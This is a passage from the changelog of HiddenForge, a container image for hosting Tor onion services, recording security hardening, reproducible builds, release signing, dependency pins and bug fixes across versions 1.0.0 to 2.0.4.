  *clamps* file mtimes to `SOURCE_DATE_EPOCH` rather than normalising them, so a
  working tree's older mtimes are baked into the layer verbatim.

- **The `.build-deps` virtual apk package was removed.** apk assigns virtual
  packages a self-generated checksum that was observed to differ between builds
  of identical source. `py3-pip` is installed by name and `apk del py3-pip`
  reclaims it along with the seven packages it pulls in.

- **Release signing uses the maintainer's identity key.** Releases through 2.0.3
  were signed with a per-project key; from 2.0.4 a single per-identity key signs
  every project. `signatures/allowed-signers` retains every key that has ever
  signed a release, so earlier releases remain independently verifiable. cosign
  is no longer used (the ML-DSA-65 and YubiKey signatures are the attestation),
  and `cosign.pub` is kept so releases up to 2.0.3 stay verifiable.

### Added
- **Operator guidance on what HiddenForge cannot protect you from**: a README
  section on application-layer deanonymization: the backend making outbound
  clearnet requests, emitting absolute URLs or its real hostname, leaking
  framework banners and ETags matchable against a clearnet scan, serving
  identical content on both networks, and leaking the server's timezone.

- **`tests/test_privileged_fs.py`** covering the symlink-refusal property of the
  privileged startup path, plus guard-pinning and portless-service tests. Suite:
  129 → 145 tests.

---

## [2.0.3] - 2026-07-16

### Added
- **Reproducible builds.** The image now builds bit-for-bit reproducibly: two
  builds of the same source commit produce an identical image digest, on any
  machine. Three sources of build-date nondeterminism were removed: the apk
  virtual build-deps package is pinned (it was auto-versioned with the build
  timestamp), the timestamped `/var/log/apk.log` is dropped, and every
  `/etc/shadow` last-change field is normalized to `SOURCE_DATE_EPOCH`. You can
  now rebuild from source and confirm the published image matches it.

### Changed
- Published to the maintainer's own registry (`sambent.dev/sam/hiddenforge`)
  alongside the Docker Hub mirror.
- User documentation moved to the project wiki.

---

## [2.0.2] - 2026-07-12

### Added
- **Intro-point DoS defence**: `HiddenServiceEnableIntroDoSDefense 1`
  (rate 25/s, burst 200) per service. Complements PoW: PoW throttles the
  rendezvous stage, this throttles `INTRODUCE2` flooding at the intro points.
- **Bootstrap-aware healthcheck**: `healthcheck.py` queries the control socket
  for `status/circuit-established` + `bootstrap-phase=100`, replacing the old
  `pidof tor` check that passed for a process that was alive but wedged.
- **Container resource limits** (both compose files): `pids_limit`, `mem_limit`,
  `memswap_limit == mem_limit` (no swap → keys never paged to disk), `cpus`,
  and `nofile`/`nproc` ulimits.
- **tmpfs `nodev`** on every tmpfs mount; explicit `apparmor=docker-default`
  (Docker compose).
- **Test suite**: host unit tests for every validator (full injection/edge
  table), torrc-generation tests, an injection-proof property test, golden
  snapshots, and property-based fuzzing (Hypothesis). Verified to kill logic
  mutations of the security surface.
- **CI**: lint (ruff/bandit/hadolint/actionlint), unit+fuzz with coverage,
  Docker and rootless-Podman smoke tests, `tor --verify-config`, and a Trivy
  vulnerability scan.
- **Release pipeline** (`release.yml`): cosign signing (maintainer key), SBOM,
  SLSA build-provenance attestation, and publish-by-digest on version tags;
  README documents image verification.
- **CI supply-chain hardening**: every GitHub Actions dependency pinned to a full
  commit SHA (actionlint to an image digest); multi-arch release builds
  (`linux/amd64` + `linux/arm64`); Dependabot for actions, the base image, and
  pip; a coverage-floor gate; a scheduled rescan of the published image for
  newly-disclosed CVEs; and failure alerts via ntfy.

### Changed
- `validate_service_name` now caps length at 63 chars.
- `resolve_to_ip` strictly validates IPv4 (rejects `999.999.999.999`,
  leading-zero octets) instead of passing malformed dotted-quads through.
- torrc generation refactored into a pure, host-testable `build_torrc_string()`
  (output proven byte-identical to the previous implementation).
- The host test suite is no longer shipped inside the production image.

### Security
- **Patched OpenSSL** (`CVE-2026-45447`, HIGH, heap use-after-free in
  `PKCS7_verify()`): bumped the digest-pinned Alpine base `3.23.4 → 3.23.5`, which
  ships OpenSSL `3.5.7-r0`. Trivy now reports the image clean of HIGH/CRITICAL.

### Fixed
- **Build was broken**: the pinned `tor=0.4.9.8-r0` had been pruned from the
  Alpine 3.23 index, so `apk add` failed for anyone building the image. Re-pinned
  to **`tor=0.4.9.11-r0`**, verified it builds, keeps `pow: yes`, imports
  vanguards, serves a backend end-to-end over Tor, and an in-place upgrade from
  the prior version preserves the existing `.onion` key (same address, no loss).
- Dockerfile now fails the build if the vanguards `SafeConfigParser` patch does
  not apply (previously a silent no-op on a future vanguards change).
- Corrected documentation: version drift (Tor/Alpine/Python), the apk
  "not hash-verified" claim (apk verifies a signed index), and the "no
  HTTP-capable code" comment (the Python stdlib retains urllib/ssl).
- Documented the L2-only guard-protection limitation for long-lived services.

---

## [2.0.1] - 2026-05-21

### Upgraded (dependency bump)
- Base image: Alpine 3.23.3 → **3.23.4** (digest re-pinned)
- Tor: 0.4.9.6 → **0.4.9.8**
- Python: 3.12.12 → **3.12.13**

These are version/digest bumps only; no behavioural changes to the entrypoint
or torrc generation. Verified: `tor --list-modules` reports `pow: yes`, and the
generated torrc passes `tor --verify-config` on the new binary.

---

## [2.0.0] - 2026-04-03

Complete security hardening rewrite. Not backwards-compatible with v1.x
due to the addition of Vanguards, the Unix control socket, and the
seccomp sandbox requirement.

### Security improvements
- **Vanguards addon**: bandguards (bandwidth side-channel detection)
  and rendguard (rendezvous-point overuse detection) alongside Tor's
  built-in vanguards-lite guard rotation
- **Tor Sandbox 1**: seccomp-bpf syscall filter; requires
  `--security-opt seccomp=unconfined` at runtime
- **Unix ControlSocket**: replaces TCP control port; only processes
  running as the `tor` user can connect
- **Proof-of-work DoS defense**: `HiddenServicePoWDefensesEnabled 1`
  per service (Tor 0.4.8+)
- **ClientOnly 1**: container will never become a relay or exit node
- **ExitPolicy reject all**: belt-and-suspenders relay prevention
- **No telemetry surface**: pip, setuptools, urllib3, certifi stripped
  from the final image; only vanguards, stem, and the standard library
  remain at runtime
- **Input validation**: all env vars validated against strict regexes
  before being written to torrc
- **AvoidDiskWrites 1**, **DisableDebuggerAttachment 1**, **SafeLogging 1**,
  **HeartbeatPeriod 0** added to torrc

### Supply chain hardening
- Base image digest-pinned: alpine:3.23.3 with full SHA256
- All apk packages pinned: tor=0.4.9.6-r0, python3=3.12.12-r0, su-exec=0.3-r0
- py3-pip installed as --virtual .build-deps and removed post-build
- All pip packages pinned with exact versions and SHA256 hashes via
  --require-hashes in requirements.txt
- stem pinned to 1.8.2 (previously unbounded)

### Usability
- New docker-compose.yml with all security flags pre-configured
- Network isolation: backend on internal: true network, no ports mapping
- logging: driver: none prevents host-side JSON log files

### Bug fixes
- Fixed HiddenServicePoWDefensesEnabled placement (must follow HiddenServiceDir)
- Fixed HiddenServiceNumIntroductionPoints option name
- Fixed rootless podman volume permission issue on parent hidden_service dir
- Replaced subprocess chown calls with native os.chown / pwd.getpwnam
- Removed dead CMD ["tor"] from Dockerfile

### Upgraded
- Base image: Alpine 3.22 to Alpine 3.23.3
- Tor: 0.4.8.17 to 0.4.9.6

---

## [1.0.0] - 2024 (original release)

Initial release. Basic hidden service support via environment variables.
Alpine base, no Vanguards, no Sandbox, no pinned dependencies.
